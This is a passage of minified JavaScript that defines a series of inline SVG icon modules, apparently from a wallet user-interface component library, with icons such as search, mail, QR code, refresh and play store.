</svg>`,Bft=Object.freeze(Object.defineProperty({__proto__:null,googleSvg:Oft},Symbol.toStringTag,{value:"Module"})),Mft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z"
    clip-rule="evenodd"
  />
</svg>`,Dft=Object.freeze(Object.defineProperty({__proto__:null,helpCircleSvg:Mft},Symbol.toStringTag,{value:"Module"})),Lft=xe`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path d="M4.98926 3.73932C4.2989 3.73932 3.73926 4.29896 3.73926 4.98932C3.73926 5.67968 4.2989 6.23932 4.98926 6.23932C5.67962 6.23932 6.23926 5.67968 6.23926 4.98932C6.23926 4.29896 5.67962 3.73932 4.98926 3.73932Z" fill="currentColor"/>
  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.60497 0.500001H6.39504C5.41068 0.499977 4.59185 0.499958 3.93178 0.571471C3.24075 0.64634 2.60613 0.809093 2.04581 1.21619C1.72745 1.44749 1.44749 1.72745 1.21619 2.04581C0.809093 2.60613 0.64634 3.24075 0.571471 3.93178C0.499958 4.59185 0.499977 5.41065 0.500001 6.39501V7.57815C0.499998 8.37476 0.499995 9.05726 0.534869 9.62725C0.570123 10.2034 0.644114 10.7419 0.828442 11.2302C0.925651 11.4877 1.05235 11.7287 1.21619 11.9542C1.44749 12.2726 1.72745 12.5525 2.04581 12.7838C2.60613 13.1909 3.24075 13.3537 3.93178 13.4285C4.59185 13.5001 5.41066 13.5 6.39503 13.5H7.60496C8.58933 13.5 9.40815 13.5001 10.0682 13.4285C10.7593 13.3537 11.3939 13.1909 11.9542 12.7838C12.2726 12.5525 12.5525 12.2726 12.7838 11.9542C13.1909 11.3939 13.3537 10.7593 13.4285 10.0682C13.5 9.40816 13.5 8.58935 13.5 7.60497V6.39505C13.5 5.41068 13.5 4.59185 13.4285 3.93178C13.3537 3.24075 13.1909 2.60613 12.7838 2.04581C12.5525 1.72745 12.2726 1.44749 11.9542 1.21619C11.3939 0.809093 10.7593 0.64634 10.0682 0.571471C9.40816 0.499958 8.58933 0.499977 7.60497 0.500001ZM3.22138 2.83422C3.38394 2.71612 3.62634 2.61627 4.14721 2.55984C4.68679 2.50138 5.39655 2.5 6.45 2.5H7.55C8.60345 2.5 9.31322 2.50138 9.8528 2.55984C10.3737 2.61627 10.6161 2.71612 10.7786 2.83422C10.9272 2.94216 11.0578 3.07281 11.1658 3.22138C11.2839 3.38394 11.3837 3.62634 11.4402 4.14721C11.4986 4.68679 11.5 5.39655 11.5 6.45V6.49703C10.9674 6.11617 10.386 5.84936 9.74213 5.81948C8.40536 5.75745 7.3556 6.73051 6.40509 7.84229C6.33236 7.92737 6.27406 7.98735 6.22971 8.02911L6.1919 8.00514L6.17483 7.99427C6.09523 7.94353 5.98115 7.87083 5.85596 7.80302C5.56887 7.64752 5.18012 7.4921 4.68105 7.4921C4.66697 7.4921 4.6529 7.49239 4.63884 7.49299C3.79163 7.52878 3.09922 8.1106 2.62901 8.55472C2.58751 8.59392 2.54594 8.6339 2.50435 8.6745C2.50011 8.34653 2.5 7.97569 2.5 7.55V6.45C2.5 5.39655 2.50138 4.68679 2.55984 4.14721C2.61627 3.62634 2.71612 3.38394 2.83422 3.22138C2.94216 3.07281 3.07281 2.94216 3.22138 2.83422ZM10.3703 8.14825C10.6798 8.37526 11.043 8.71839 11.4832 9.20889C11.4744 9.44992 11.4608 9.662 11.4402 9.8528C11.3837 10.3737 11.2839 10.6161 11.1658 10.7786C11.0578 10.9272 10.9272 11.0578 10.7786 11.1658C10.6161 11.2839 10.3737 11.3837 9.8528 11.4402C9.31322 11.4986 8.60345 11.5 7.55 11.5H6.45C5.39655 11.5 4.68679 11.4986 4.14721 11.4402C3.62634 11.3837 3.38394 11.2839 3.22138 11.1658C3.15484 11.1174 3.0919 11.0645 3.03298 11.0075C3.10126 10.9356 3.16806 10.8649 3.23317 10.7959L3.29772 10.7276C3.55763 10.4525 3.78639 10.2126 4.00232 10.0087C4.22016 9.80294 4.39412 9.66364 4.53524 9.57742C4.63352 9.51738 4.69022 9.49897 4.71275 9.49345C4.76387 9.49804 4.81803 9.51537 4.90343 9.56162C4.96409 9.59447 5.02355 9.63225 5.11802 9.69238L5.12363 9.69595C5.20522 9.74789 5.32771 9.82587 5.46078 9.89278C5.76529 10.0459 6.21427 10.186 6.74977 10.0158C7.21485 9.86796 7.59367 9.52979 7.92525 9.14195C8.91377 7.98571 9.38267 7.80495 9.64941 7.81733C9.7858 7.82366 10.0101 7.884 10.3703 8.14825Z" fill="currentColor"/>
</svg>`,Uft=Object.freeze(Object.defineProperty({__proto__:null,imageSvg:Lft},Symbol.toStringTag,{value:"Module"})),jft=xe`<svg
 xmlns="http://www.w3.org/2000/svg"
 width="28"
 height="28"
 viewBox="0 0 28 28"
 fill="none">
  <path
    fill="#949E9E"
    fill-rule="evenodd"
    d="M7.974 2.975h12.052c1.248 0 2.296 0 3.143.092.89.096 1.723.307 2.461.844a4.9 4.9 0 0 1 1.084 1.084c.537.738.748 1.57.844 2.461.092.847.092 1.895.092 3.143v6.802c0 1.248 0 2.296-.092 3.143-.096.89-.307 1.723-.844 2.461a4.9 4.9 0 0 1-1.084 1.084c-.738.537-1.57.748-2.461.844-.847.092-1.895.092-3.143.092H7.974c-1.247 0-2.296 0-3.143-.092-.89-.096-1.723-.307-2.461-.844a4.901 4.901 0 0 1-1.084-1.084c-.537-.738-.748-1.571-.844-2.461C.35 19.697.35 18.649.35 17.4v-6.802c0-1.248 0-2.296.092-3.143.096-.89.307-1.723.844-2.461A4.9 4.9 0 0 1 2.37 3.91c.738-.537 1.571-.748 2.461-.844.847-.092 1.895-.092 3.143-.092ZM5.133 5.85c-.652.071-.936.194-1.117.326a2.1 2.1 0 0 0-.465.465c-.132.181-.255.465-.325 1.117-.074.678-.076 1.573-.076 2.917v6.65c0 1.344.002 2.239.076 2.917.07.652.193.936.325 1.117a2.1 2.1 0 0 0 .465.465c.181.132.465.255 1.117.326.678.073 1.574.075 2.917.075h11.9c1.344 0 2.239-.002 2.917-.075.652-.071.936-.194 1.117-.326.179-.13.335-.286.465-.465.132-.181.255-.465.326-1.117.073-.678.075-1.573.075-2.917v-6.65c0-1.344-.002-2.239-.075-2.917-.071-.652-.194-.936-.326-1.117a2.1 2.1 0 0 0-.465-.465c-.181-.132-.465-.255-1.117-.326-.678-.073-1.573-.075-2.917-.075H8.05c-1.343 0-2.239.002-2.917.075Zm.467 7.275a3.15 3.15 0 1 1 6.3 0 3.15 3.15 0 0 1-6.3 0Zm8.75-1.75a1.4 1.4 0 0 1 1.4-1.4h3.5a1.4 1.4 0 0 1 0 2.8h-3.5a1.4 1.4 0 0 1-1.4-1.4Zm0 5.25a1.4 1.4 0 0 1 1.4-1.4H21a1.4 1.4 0 1 1 0 2.8h-5.25a1.4 1.4 0 0 1-1.4-1.4Z"
    clip-rule="evenodd"/>
</svg>`,Fft=Object.freeze(Object.defineProperty({__proto__:null,idSvg:jft},Symbol.toStringTag,{value:"Module"})),qft=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    d="M6 10.49a1 1 0 1 0 2 0v-2a1 1 0 0 0-2 0v2ZM7 4.49a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 14.99a7 7 0 1 0 0-14 7 7 0 0 0 0 14Zm5-7a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"
    clip-rule="evenodd"
  />
</svg>`,zft=Object.freeze(Object.defineProperty({__proto__:null,infoCircleSvg:qft},Symbol.toStringTag,{value:"Module"})),Wft=xe`<svg width="10" height="10" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M5.00177 1.78569C3.8179 1.78569 2.85819 2.74508 2.85819 3.92855C2.85819 4.52287 3.09928 5.05956 3.49077 5.4485L3.5005 5.45817C3.64381 5.60054 3.76515 5.72108 3.85631 5.81845C3.93747 5.90512 4.05255 6.03218 4.12889 6.1805C4.16999 6.26034 4.19 6.30843 4.21768 6.39385C4.22145 6.40546 4.22499 6.41703 4.22833 6.42855H5.77521C5.77854 6.41703 5.78208 6.40547 5.78585 6.39385C5.81353 6.30843 5.83354 6.26034 5.87464 6.1805C5.95098 6.03218 6.06606 5.90512 6.14722 5.81845C6.23839 5.72108 6.35973 5.60053 6.50304 5.45816L6.51276 5.4485C6.90425 5.05956 7.14534 4.52287 7.14534 3.92855C7.14534 2.74508 6.18563 1.78569 5.00177 1.78569ZM5.71629 7.85712H4.28724C4.28724 8.21403 4.28876 8.40985 4.30703 8.54571C4.30727 8.54748 4.30751 8.54921 4.30774 8.55091C4.30944 8.55115 4.31118 8.55138 4.31295 8.55162C4.44884 8.56989 4.64474 8.5714 5.00177 8.5714C5.3588 8.5714 5.55469 8.56989 5.69059 8.55162C5.69236 8.55138 5.69409 8.55115 5.69579 8.55091C5.69603 8.54921 5.69627 8.54748 5.6965 8.54571C5.71477 8.40985 5.71629 8.21403 5.71629 7.85712ZM2.85819 7.14283C2.85819 6.9948 2.85796 6.91114 2.8548 6.85032C2.85461 6.84656 2.85441 6.84309 2.85421 6.83988C2.84393 6.8282 2.83047 6.81334 2.81301 6.79469C2.74172 6.71856 2.63908 6.61643 2.48342 6.46178C1.83307 5.81566 1.42914 4.91859 1.42914 3.92855C1.42914 1.9561 3.02866 0.357117 5.00177 0.357117C6.97487 0.357117 8.57439 1.9561 8.57439 3.92855C8.57439 4.91859 8.17047 5.81566 7.52012 6.46178C7.36445 6.61643 7.26182 6.71856 7.19053 6.79469C7.17306 6.81334 7.1596 6.8282 7.14932 6.83988C7.14912 6.84309 7.14892 6.84656 7.14873 6.85032C7.14557 6.91114 7.14534 6.9948 7.14534 7.14283V7.85712C7.14534 7.87009 7.14535 7.88304 7.14535 7.89598C7.14541 8.19889 7.14547 8.49326 7.11281 8.73606C7.076 9.00978 6.98631 9.32212 6.72678 9.58156C6.46726 9.841 6.15481 9.93065 5.881 9.96745C5.63813 10.0001 5.34365 10 5.04064 9.99998C5.0277 9.99998 5.01474 9.99998 5.00177 9.99998C4.98879 9.99998 4.97583 9.99998 4.96289 9.99998C4.65988 10 4.36541 10.0001 4.12253 9.96745C3.84872 9.93065 3.53628 9.841 3.27675 9.58156C3.01722 9.32212 2.92753 9.00978 2.89072 8.73606C2.85807 8.49326 2.85812 8.19889 2.85818 7.89598C2.85819 7.88304 2.85819 7.87008 2.85819 7.85712V7.14283ZM7.1243 6.86977C7.12366 6.87069 7.1233 6.87116 7.12327 6.87119C7.12323 6.87123 7.12356 6.87076 7.1243 6.86977ZM2.88027 6.8712C2.88025 6.87119 2.87988 6.8707 2.87921 6.86975C2.87995 6.87072 2.88028 6.8712 2.88027 6.8712Z" fill="#949E9E"/>
</svg>`,Hft=Object.freeze(Object.defineProperty({__proto__:null,lightbulbSvg:Wft},Symbol.toStringTag,{value:"Module"})),Vft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.83 1.34h6.34c.68 0 1.26 0 1.73.04.5.05.97.15 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73v3.71c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.47.03-1.05.03-1.73.03H4.83c-.68 0-1.26 0-1.73-.04-.5-.04-.97-.14-1.42-.4-.52-.29-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.41A20.9 20.9 0 0 1 0 9.88v-3.7c0-.7 0-1.27.04-1.74.05-.5.14-.97.4-1.42.3-.52.72-.95 1.24-1.24.45-.25.92-.35 1.42-.4.47-.04 1.05-.04 1.73-.04ZM3.28 3.38c-.36.03-.51.08-.6.14-.21.11-.39.29-.5.5a.8.8 0 0 0-.08.19l5.16 3.44c.45.3 1.03.3 1.48 0L13.9 4.2a.79.79 0 0 0-.08-.2c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.13-.37-.04-.86-.04-1.6-.04H4.88c-.73 0-1.22 0-1.6.04ZM14 6.54 9.85 9.31a3.33 3.33 0 0 1-3.7 0L2 6.54v3.3c0 .74 0 1.22.03 1.6.04.36.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h6.25c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6v-3.3Z"
    clip-rule="evenodd"
  />
</svg>`,Kft=Object.freeze(Object.defineProperty({__proto__:null,mailSvg:Vft},Symbol.toStringTag,{value:"Module"})),Gft=xe`<svg fill="none" viewBox="0 0 20 20">
  <path fill="currentColor" d="M10.81 5.81a2 2 0 1 1-4 0 2 2 0 0 1 4 0Z" />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3 4.75A4.75 4.75 0 0 1 7.75 0h4.5A4.75 4.75 0 0 1 17 4.75v10.5A4.75 4.75 0 0 1 12.25 20h-4.5A4.75 4.75 0 0 1 3 15.25V4.75ZM7.75 2A2.75 2.75 0 0 0 5 4.75v10.5A2.75 2.75 0 0 0 7.75 18h4.5A2.75 2.75 0 0 0 15 15.25V4.75A2.75 2.75 0 0 0 12.25 2h-4.5Z"
    clip-rule="evenodd"
  />
</svg>`,Zft=Object.freeze(Object.defineProperty({__proto__:null,mobileSvg:Gft},Symbol.toStringTag,{value:"Module"})),Yft=xe`<svg fill="none" viewBox="0 0 41 40">
  <path
    style="fill: var(--wui-color-fg-100);"
    fill-opacity=".05"
    d="M.6 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z"
  />
  <path
    fill="#949E9E"
    d="M15.6 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM23.1 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM28.1 22.81a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"
  />
</svg>`,Jft=Object.freeze(Object.defineProperty({__proto__:null,moreSvg:Yft},Symbol.toStringTag,{value:"Module"})),Qft=xe`<svg fill="none" viewBox="0 0 22 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M16.32 13.62a3.14 3.14 0 1 1-.99 1.72l-1.6-.93a3.83 3.83 0 0 1-3.71 1 3.66 3.66 0 0 1-1.74-1l-1.6.94a3.14 3.14 0 1 1-1-1.73l1.6-.94a3.7 3.7 0 0 1 0-2 3.81 3.81 0 0 1 1.8-2.33c.29-.17.6-.3.92-.38V6.1a3.14 3.14 0 1 1 2 0l-.01.02v1.85H12a3.82 3.82 0 0 1 2.33 1.8 3.7 3.7 0 0 1 .39 2.91l1.6.93ZM2.6 16.54a1.14 1.14 0 0 0 1.98-1.14 1.14 1.14 0 0 0-1.98 1.14ZM11 2.01a1.14 1.14 0 1 0 0 2.28 1.14 1.14 0 0 0 0-2.28Zm1.68 10.45c.08-.19.14-.38.16-.58v-.05l.02-.13v-.13a1.92 1.92 0 0 0-.24-.8l-.11-.15a1.89 1.89 0 0 0-.74-.6 1.86 1.86 0 0 0-.77-.17h-.19a1.97 1.97 0 0 0-.89.34 1.98 1.98 0 0 0-.61.74 1.99 1.99 0 0 0-.16.9v.05a1.87 1.87 0 0 0 .24.74l.1.15c.12.16.26.3.42.42l.16.1.13.07.04.02a1.84 1.84 0 0 0 .76.17h.17a2 2 0 0 0 .91-.35 1.78 1.78 0 0 0 .52-.58l.03-.05a.84.84 0 0 0 .05-.11Zm5.15 4.5a1.14 1.14 0 0 0 1.14-1.97 1.13 1.13 0 0 0-1.55.41c-.32.55-.13 1.25.41 1.56Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.63 9.43a1.5 1.5 0 1 0 1.5-2.6 1.5 1.5 0 0 0-1.5 2.6Zm.32-1.55a.5.5 0 0 1 .68-.19.5.5 0 0 1 .18.68.5.5 0 0 1-.68.19.5.5 0 0 1-.18-.68ZM17.94 8.88a1.5 1.5 0 1 1-2.6-1.5 1.5 1.5 0 1 1 2.6 1.5ZM16.9 7.69a.5.5 0 0 0-.68.19.5.5 0 0 0 .18.68.5.5 0 0 0 .68-.19.5.5 0 0 0-.18-.68ZM9.75 17.75a1.5 1.5 0 1 1 2.6 1.5 1.5 1.5 0 1 1-2.6-1.5Zm1.05 1.18a.5.5 0 0 0 .68-.18.5.5 0 0 0-.18-.68.5.5 0 0 0-.68.18.5.5 0 0 0 .18.68Z"
    clip-rule="evenodd"
  />
</svg>`,Xft=Object.freeze(Object.defineProperty({__proto__:null,networkPlaceholderSvg:Qft},Symbol.toStringTag,{value:"Module"})),ept=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.13 1h1.71c1.46 0 2.63 0 3.56.1.97.1 1.8.33 2.53.85a5 5 0 0 1 1.1 1.11c.53.73.75 1.56.86 2.53.1.93.1 2.1.1 3.55v1.72c0 1.45 0 2.62-.1 3.55-.1.97-.33 1.8-.86 2.53a5 5 0 0 1-1.1 1.1c-.73.53-1.56.75-2.53.86-.93.1-2.1.1-3.55.1H9.13c-1.45 0-2.62 0-3.56-.1-.96-.1-1.8-.33-2.52-.85a5 5 0 0 1-1.1-1.11 5.05 5.05 0 0 1-.86-2.53c-.1-.93-.1-2.1-.1-3.55V9.14c0-1.45 0-2.62.1-3.55.1-.97.33-1.8.85-2.53a5 5 0 0 1 1.1-1.1 5.05 5.05 0 0 1 2.53-.86C6.51 1 7.67 1 9.13 1ZM5.79 3.09a3.1 3.1 0 0 0-1.57.48 3 3 0 0 0-.66.67c-.24.32-.4.77-.48 1.56-.1.82-.1 1.88-.1 3.4v1.6c0 1.15 0 2.04.05 2.76l.41-.42c.5-.5.93-.92 1.32-1.24.41-.33.86-.6 1.43-.7a3 3 0 0 1 .94 0c.35.06.66.2.95.37a17.11 17.11 0 0 0 .8.45c.1-.08.2-.2.41-.4l.04-.03a27 27 0 0 1 1.95-1.84 4.03 4.03 0 0 1 1.91-.94 4 4 0 0 1 1.25 0c.73.11 1.33.46 1.91.94l.64.55V9.2c0-1.52 0-2.58-.1-3.4a3.1 3.1 0 0 0-.48-1.56 3 3 0 0 0-.66-.67 3.1 3.1 0 0 0-1.56-.48C13.37 3 12.3 3 10.79 3h-1.6c-1.52 0-2.59 0-3.4.09Zm11.18 10-.04-.05a26.24 26.24 0 0 0-1.83-1.74c-.45-.36-.73-.48-.97-.52a2 2 0 0 0-.63 0c-.24.04-.51.16-.97.52-.46.38-1.01.93-1.83 1.74l-.02.02c-.17.18-.34.34-.49.47a2.04 2.04 0 0 1-1.08.5 1.97 1.97 0 0 1-1.25-.27l-.79-.46-.02-.02a.65.65 0 0 0-.24-.1 1 1 0 0 0-.31 0c-.08.02-.21.06-.49.28-.3.24-.65.59-1.2 1.14l-.56.56-.65.66a3 3 0 0 0 .62.6c.33.24.77.4 1.57.49.81.09 1.88.09 3.4.09h1.6c1.52 0 2.58 0 3.4-.09a3.1 3.1 0 0 0 1.56-.48 3 3 0 0 0 .66-.67c.24-.32.4-.77.49-1.56l.07-1.12Zm-8.02-1.03ZM4.99 7a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
    clip-rule="evenodd"
  />
</svg>`,tpt=Object.freeze(Object.defineProperty({__proto__:null,nftPlaceholderSvg:ept},Symbol.toStringTag,{value:"Module"})),rpt=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 0a1 1 0 0 1 1 1v5.38a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1ZM5.26 2.6a1 1 0 0 1-.28 1.39 5.46 5.46 0 1 0 6.04 0 1 1 0 1 1 1.1-1.67 7.46 7.46 0 1 1-8.25 0 1 1 0 0 1 1.4.28Z"
    clip-rule="evenodd"
  />
</svg>`,ipt=Object.freeze(Object.defineProperty({__proto__:null,offSvg:rpt},Symbol.toStringTag,{value:"Module"})),npt=xe` <svg
  width="36"
  height="36"
  fill="none"
>
  <path
    d="M0 8a8 8 0 0 1 8-8h20a8 8 0 0 1 8 8v20a8 8 0 0 1-8 8H8a8 8 0 0 1-8-8V8Z"
    fill="#fff"
    fill-opacity=".05"
  />
  <path
    d="m18.262 17.513-8.944 9.49v.01a2.417 2.417 0 0 0 3.56 1.452l.026-.017 10.061-5.803-4.703-5.132Z"
    fill="#EA4335"
  />
  <path
    d="m27.307 15.9-.008-.008-4.342-2.52-4.896 4.36 4.913 4.912 4.325-2.494a2.42 2.42 0 0 0 .008-4.25Z"
    fill="#FBBC04"
  />
  <path
    d="M9.318 8.997c-.05.202-.084.403-.084.622V26.39c0 .218.025.42.084.621l9.246-9.247-9.246-8.768Z"
    fill="#4285F4"
  />
  <path
    d="m18.33 18 4.627-4.628-10.053-5.828a2.427 2.427 0 0 0-3.586 1.444L18.329 18Z"
    fill="#34A853"
  />
  <path
    d="M8 .5h20A7.5 7.5 0 0 1 35.5 8v20a7.5 7.5 0 0 1-7.5 7.5H8A7.5 7.5 0 0 1 .5 28V8A7.5 7.5 0 0 1 8 .5Z"
    stroke="#fff"
    stroke-opacity=".05"
  />
</svg>`,spt=Object.freeze(Object.defineProperty({__proto__:null,playStoreSvg:npt},Symbol.toStringTag,{value:"Module"})),opt=xe`<svg
  width="13"
  height="12"
  viewBox="0 0 13 12"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M0.794373 5.99982C0.794373 5.52643 1.17812 5.14268 1.6515 5.14268H5.643V1.15109C5.643 0.677701 6.02675 0.293946 6.50012 0.293945C6.9735 0.293946 7.35725 0.677701 7.35725 1.15109V5.14268H11.3488C11.8221 5.14268 12.2059 5.52643 12.2059 5.99982C12.2059 6.47321 11.8221 6.85696 11.3488 6.85696H7.35725V10.8486C7.35725 11.3219 6.9735 11.7057 6.50012 11.7057C6.02675 11.7057 5.643 11.3219 5.643 10.8486V6.85696H1.6515C1.17812 6.85696 0.794373 6.47321 0.794373 5.99982Z"
  /></svg
>`,apt=Object.freeze(Object.defineProperty({__proto__:null,plusSvg:opt},Symbol.toStringTag,{value:"Module"})),cpt=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M3 6a3 3 0 0 1 3-3h1a1 1 0 1 0 0-2H6a5 5 0 0 0-5 5v1a1 1 0 0 0 2 0V6ZM13 1a1 1 0 1 0 0 2h1a3 3 0 0 1 3 3v1a1 1 0 1 0 2 0V6a5 5 0 0 0-5-5h-1ZM3 13a1 1 0 1 0-2 0v1a5 5 0 0 0 5 5h1a1 1 0 1 0 0-2H6a3 3 0 0 1-3-3v-1ZM19 13a1 1 0 1 0-2 0v1a3 3 0 0 1-3 3h-1a1 1 0 1 0 0 2h1.01a5 5 0 0 0 5-5v-1ZM5.3 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05A1.5 1.5 0 0 0 9.2 8.14c.06-.2.06-.43.06-.89s0-.7-.06-.89A1.5 1.5 0 0 0 8.14 5.3c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM10.8 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM5.26 12.75c0-.46 0-.7.05-.89a1.5 1.5 0 0 1 1.06-1.06c.19-.05.42-.05.89-.05.46 0 .7 0 .88.05.52.14.93.54 1.06 1.06.06.2.06.43.06.89s0 .7-.06.89a1.5 1.5 0 0 1-1.06 1.06c-.19.05-.42.05-.88.05-.47 0-.7 0-.9-.05a1.5 1.5 0 0 1-1.05-1.06c-.05-.2-.05-.43-.05-.89ZM10.8 11.86c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06Z"
  />
</svg>`,lpt=Object.freeze(Object.defineProperty({__proto__:null,qrCodeIcon:cpt},Symbol.toStringTag,{value:"Module"})),upt=xe`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    d="M8.8071 0.292893C9.19763 0.683417 9.19763 1.31658 8.8071 1.70711L6.91421 3.6H11.8404C14.3368 3.6 16.5533 5.1975 17.3427 7.56588L17.4487 7.88377C17.6233 8.40772 17.3402 8.97404 16.8162 9.14868C16.2923 9.32333 15.726 9.04017 15.5513 8.51623L15.4453 8.19834C14.9281 6.64664 13.476 5.6 11.8404 5.6H6.91421L8.8071 7.49289C9.19763 7.88342 9.19763 8.51658 8.8071 8.90711C8.41658 9.29763 7.78341 9.29763 7.39289 8.90711L3.79289 5.30711C3.40236 4.91658 3.40236 4.28342 3.79289 3.89289L7.39289 0.292893C7.78341 -0.0976311 8.41658 -0.0976311 8.8071 0.292893ZM4.18377 10.8513C4.70771 10.6767 5.27403 10.9598 5.44868 11.4838L5.55464 11.8017C6.07188 13.3534 7.52401 14.4 9.15964 14.4L14.0858 14.4L12.1929 12.5071C11.8024 12.1166 11.8024 11.4834 12.1929 11.0929C12.5834 10.7024 13.2166 10.7024 13.6071 11.0929L17.2071 14.6929C17.5976 15.0834 17.5976 15.7166 17.2071 16.1071L13.6071 19.7071C13.2166 20.0976 12.5834 20.0976 12.1929 19.7071C11.8024 19.3166 11.8024 18.6834 12.1929 18.2929L14.0858 16.4L9.15964 16.4C6.66314 16.4 4.44674 14.8025 3.65728 12.4341L3.55131 12.1162C3.37667 11.5923 3.65983 11.026 4.18377 10.8513Z"
  /></svg
>`,dpt=Object.freeze(Object.defineProperty({__proto__:null,recycleHorizontalSvg:upt},Symbol.toStringTag,{value:"Module"})),hpt=xe`<svg fill="none" viewBox="0 0 14 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
    clip-rule="evenodd"
  />
</svg>`,fpt=Object.freeze(Object.defineProperty({__proto__:null,refreshSvg:hpt},Symbol.toStringTag,{value:"Module"})),ppt=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.36 4.21a5.14 5.14 0 1 0 0 10.29 5.14 5.14 0 0 0 0-10.29ZM1.64 9.36a7.71 7.71 0 1 1 14 4.47l2.52 2.5a1.29 1.29 0 1 1-1.82 1.83l-2.51-2.51A7.71 7.71 0 0 1 1.65 9.36Z"
    clip-rule="evenodd"
  />
</svg>`,gpt=Object.freeze(Object.defineProperty({__proto__:null,searchSvg:ppt},Symbol.toStringTag,{value:"Module"})),mpt=xe`<svg fill="none" viewBox="0 0 21 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.3808 4.34812C13.72 4.47798 12.8501 4.7587 11.5748 5.17296L9.00869 6.00646C6.90631 6.68935 5.40679 7.17779 4.38121 7.63178C3.87166 7.85734 3.5351 8.05091 3.32022 8.22035C3.11183 8.38466 3.07011 8.48486 3.05969 8.51817C2.98058 8.77103 2.98009 9.04195 3.05831 9.29509C3.06861 9.32844 3.10998 9.42878 3.31777 9.59384C3.53205 9.76404 3.86792 9.95881 4.37667 10.1862C5.29287 10.5957 6.58844 11.0341 8.35529 11.6164L10.8876 8.59854C11.2426 8.17547 11.8733 8.12028 12.2964 8.47528C12.7195 8.83029 12.7746 9.46104 12.4196 9.88412L9.88738 12.9019C10.7676 14.5408 11.4244 15.7406 11.9867 16.5718C12.299 17.0333 12.5491 17.3303 12.7539 17.5117C12.9526 17.6877 13.0586 17.711 13.0932 17.7154C13.3561 17.7484 13.6228 17.7009 13.8581 17.5791C13.8891 17.563 13.9805 17.5046 14.1061 17.2708C14.2357 17.0298 14.3679 16.6647 14.5015 16.1237C14.7705 15.0349 14.9912 13.4733 15.2986 11.2843L15.6738 8.61249C15.8603 7.28456 15.9857 6.37917 15.9989 5.7059C16.012 5.03702 15.9047 4.8056 15.8145 